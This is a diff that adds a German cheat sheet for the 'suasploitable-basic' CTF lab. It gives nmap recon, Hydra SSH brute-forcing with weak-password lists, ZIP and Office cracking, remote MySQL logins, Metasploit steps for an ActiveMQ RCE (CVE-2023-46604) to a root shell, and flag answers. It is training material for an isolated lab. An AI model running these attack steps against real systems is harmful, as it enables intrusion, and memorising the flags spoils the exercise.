@@ -1,0 +1,175 @@
+SUASecLab CTF – Cheat-Sheet für "suasploitable-basic"
+====================================================
+(Fallback, falls das automatische Script nicht funktioniert)
+
+Ziel / Umgebung
+---------------
+- Ziel-Host: basic.suaseclab.de (im isolierten Labornetz, Kali + SUASploitable-Paar)
+- OS: Debian 12, wird täglich ca. 06:00 Uhr zurückgesetzt
+- Standard-Creds/Defaults (Repo): Build-User vagrant:vagrant; Passwörter im Lab können abweichen,
+  viele schwache Passwörter stammen aus der "500 worst passwords"-Liste (SecLists).
+
+Wortliste
+---------
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt -O 500-worst-passwords.txt
+# Hinweis: "vagrant" steht nicht in der Liste, aber separat testen.
+
+1) Recon
+--------
+# Ziel-IP ermitteln (falls basic.suaseclab.de nicht auflöst)
+ip a
+nmap -sn 192.168.X.0/24   # eigenes /24 einsetzen
+
+# Vollscan
+sudo nmap -sV -sC -p- -T4 basic.suaseclab.de -oN nmap_full.txt
+# Erwartete Dienste: 22/SSH, 80/HTTP (Apache/Jorani/phpMyAdmin), 3306/MySQL(MariaDB),
+# 8080/JuiceShop, 10000/TCP-Server, 61616/8161/ActiveMQ
+
+2) SSH (Port 22) – schwache Passwörter / Root-Login
+----------------------------------------------------
+- Root-Login und Passwort-Auth sind erlaubt (kein Pubkey-Zwang).
+- User (u.a.): root, vagrant, mnickel, ksaenger, kfaber, sdietrich, kfurst, jjager, cschmitz
+- mnickel hat sudo-Rechte (wichtig für PrivEsc/volle Sicht).
+- Bekannte/schwache Passwörter (im Repo-Build): mnickel:testing, kfurst:fish, jjager:mountain, vagrant:vagrant
+  (weitere aus 500-worst-passwords.txt).
+
+Hydra-Beispiele:
+  echo -e "root\nvagrant\nmnickel\nksaenger\nkfaber\nsdietrich\nkfurst\njjager\ncschmitz" > users.txt
+  hydra -L users.txt -P 500-worst-passwords.txt ssh://basic.suaseclab.de
+  # gezielt:
+  hydra -l mnickel -P 500-worst-passwords.txt ssh://basic.suaseclab.de
+
+Nach Login nützlich:
+  id; sudo -l; cat /etc/passwd; ls /home
+  cat /home/jjager/info.txt        # enthält Flag (falls vorhanden)
+  cat /tmp/flags.txt               # (oft root-lesbar; mit sudo)
+
+3) Web (Port 80) – Jorani 1.0.0, Dateien, phpMyAdmin
+-----------------------------------------------------
+Basis: http://basic.suaseclab.de/
+- Jorani 1.0.0 (Leave-Management): bekannte Schwachstellen
+  - XSS (Exploit-DB 51715) – Infos auslesen
+  - RCE / Reverse Shell (CVE-2023-26469) – z.B. via Metasploit suchen:
+      msfconsole -q
+      search jorani
+      search CVE-2023-26469
+  - Login-Seite: /session/login (Kali-Simulation loggt periodisch als kfaber ein)
+- Interessante Dateien im Webroot:
+  - http://basic.suaseclab.de/backup.sql   (DB-Dump Jorani, enthält u.a. Hinweise/Flags)
+  - http://basic.suaseclab.de/files.zip    (passwortgeschützte Übung, s.u.)
+- phpMyAdmin: http://basic.suaseclab.de/phpmyadmin/ (Version ~4.9.11 im Build)
+- Jorani-DB-Konfig auf dem Server (nach Shell-Zugriff): /var/www/html/application/config/database.php
+  (im Build: User lms, Passwort ZDS6P4Mw, DB jorani)
+
+Dateien holen:
+  wget http://basic.suaseclab.de/backup.sql
+  wget http://basic.suaseclab.de/files.zip
+
+backup.sql auswerten (Flags/Hinweise im Build u.a.):
+  - Einstellungsdatum (Karolin Saenger): 2025-06-03
+  - E-Mail User id 5: s.dietrich@suaseclab.de
+  - Grund für Abwesenheit (Katja Furst, Mutterschaft/Leave): maternity
+  - Bonus-Passwort/Infos im Dump prüfen (z.B. 53VQR8TE im Kontext)
+
+4) files.zip – mehrstufiges Knacken
+-----------------------------------
+Äußere ZIP-Verschlüsselung:
+  fcrackzip -u -D -p 500-worst-passwords.txt files.zip
+  # bekanntes Passwort (Build): startrek
+  unzip -P startrek files.zip -d files_unzipped
+
+Innere Dateien sind zusätzlich verschlüsselt (aus dem Build/Analyse):
+  - files/pdf.pdf  -> PDF mit Benutzerpasswort (AES): super
+  - files/word.docx (bzw. OLE/Office-Datei) -> Office-Passwort: porsche
+
+Entsperren (Beispiele):
+  # PDF
+  pip3 install --user pikepdf
+  python3 - <<'PY'
+import pikepdf
+pdf = pikepdf.open('files_unzipped/files/pdf.pdf', password='super')
+pdf.save('pdf_decrypted.pdf')
+PY
+
+  # Word/OLE
+  pip3 install --user msoffcrypto-tool
+  python3 - <<'PY'
+import msoffcrypto, io
+with open('files_unzipped/files/word.docx','rb') as f:
+    of = msoffcrypto.OfficeFile(f); of.load_key(password='porsche')
+    with open('word_decrypted.docx','wb') as out: of.decrypt(out)
+PY
+  # Alternativ: pdfcrack/john/office2john je nach Tooling.
+
+5) MariaDB (Port 3306) – remote, schwache Credentials
+------------------------------------------------------
+Von außen erreichbar. Bekannte/schwache Accounts (Build):
+  admin:cocacola, test:rainbow, info:dolphins, lms:ZDS6P4Mw
+
+Verbinden und auswerten:
+  mysql -h basic.suaseclab.de -u admin -pcocacola -e "SHOW DATABASES;"
+  mysql -h basic.suaseclab.de -u admin -pcocacola -e "SELECT * FROM information.test;"
+  mysql -h basic.suaseclab.de -u lms -pZDS6P4Mw jorani -e "SELECT id,login,email,datehired FROM users;"
+  mysql -h basic.suaseclab.de -u lms -pZDS6P4Mw jorani -e "SHOW TABLES;"
+  mysql -h basic.suaseclab.de -u lms -pZDS6P4Mw jorani -e "SELECT * FROM leaves;"
+  mysql -h basic.suaseclab.de -u lms -pZDS6P4Mw jorani -e "SELECT * FROM leaves_history;"
+
+Relevante DB-Hinweise/Flags (Build): information.test enthält u.a. 3YPGxmZ8;
+in Jorani: datehired (2025-06-03), E-Mail (s.dietrich@suaseclab.de), Abwesenheitsgrund maternity.
+
+6) ActiveMQ (Port 61616) – RCE als root (Bonus)
+-----------------------------------------------
+- ActiveMQ 5.18.0, verwundbar: CVE-2023-46604 (RCE). Dienst läuft als root -> Root-Shell.
+- Metasploit (Modulname auf Kali prüfen):
+    msfconsole -q
+    use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
+    set RHOSTS basic.suaseclab.de
+    set RPORT 61616
+    set SRVHOST <KALI_IP>
+    set LHOST <KALI_IP>
+    check
+    run
+- Bonus-Flag im Build-Kontext: CVE-2023-46604
+
+7) Eigener TCP-Server (Port 10000)
+----------------------------------
+- Sendet/empfängt Daten im Klartext; Flags können per Wireshark mitgeschnitten werden.
+- Manuell verbinden:
+    nc basic.suaseclab.de 10000
+    help   -> liefert Bonus-Flag (im Build: aaiN3qPY, Antwort "flag:aaiN3qPY")
+    exit
+- Kali-seitig läuft (im Lab) ein tcp_client (/opt/tcp_client), der periodisch Flags sendet
+  (im Build u.a. FSe2GLGW, x5WdT8cZ, 6y6GCdnz) und sich zyklisch per Web einloggt.
+- Wireshark: Interface wählen, Filter z.B. tcp.port == 10000, Traffic mitschneiden.
+
+8) JuiceShop (Port 8080)
+------------------------
+- OWASP Juice Shop im Docker-Container: http://basic.suaseclab.de:8080
+- Übliche Web-Challenges (SQLi, XSS, etc.) je nach Aufgabenstellung.
+
+9) Kali-lokale CTF-Flags (auf der Kali-VM selbst, falls vorhanden)
+------------------------------------------------------------------
+Typisch unter /home/laboratory (kali_ctf.sh): 
+  echo $FLAG, .hidden_flag, /flag.txt (ASCII-Bär -> "bear"), flags/flag.txt (tar.gz),
+  flags/part.txt + flags/another_part.txt, flags/truncate.txt, .bash_history, 
+  flags/representation.txt (base64), flags/checksums.txt (md5/sha256/sha512 Präfixe),
+  flags/other.txt (/usr/bin/msfconsole, Rechte von /etc/passwd = 0644, Gruppe von /etc/shadow = shadow).
+Bekannte Werte (Build): vA5kwQxF, Dm6ELvkr, bear, egFE2W5R, Edm3jiDz, bA2y26sg, 82iwnJax,
+TUj4xXYj, QshMT6Th, a7a7f6b4, ba508457, 1e7180ed.
+
+10) Schneller "alles Wichtige" Ablauf (kompakt)
+-----------------------------------------------
+1. nmap -sV -sC -p- <IP>
+2. wget backup.sql, files.zip; fcrackzip/unzip (startrek) + innere Entschlüsselung (super/porsche)
+3. mysql mit admin:cocacola / lms:ZDS6P4Mw -> information + jorani durchsuchen
+4. nc <IP> 10000 -> help; Wireshark auf 10000
+5. hydra/ssh mit users.txt + 500-worst (vagrant separat) -> mnickel (sudo) -> /home, /tmp/flags.txt
+6. msfconsole -> ActiveMQ CVE-2023-46604 (root), Jorani CVE-2023-26469 suchen/ausnutzen
+7. JuiceShop auf :8080 bearbeiten
+8. Kali-lokale Flags unter ~ einsammeln
+
+Hinweise
+--------
+- Flags/Passwörter können je nach Instanz/Reset variieren; nutze dies als Leitfaden und prüfe live.
+- Einige Aktionen erfordern sudo auf Kali (nmap, wireshark) bzw. passende Tools (hydra, msfconsole, fcrackzip, gobuster).
+- Nur im autorisierten SUASecLab-CTF/Labor verwenden.
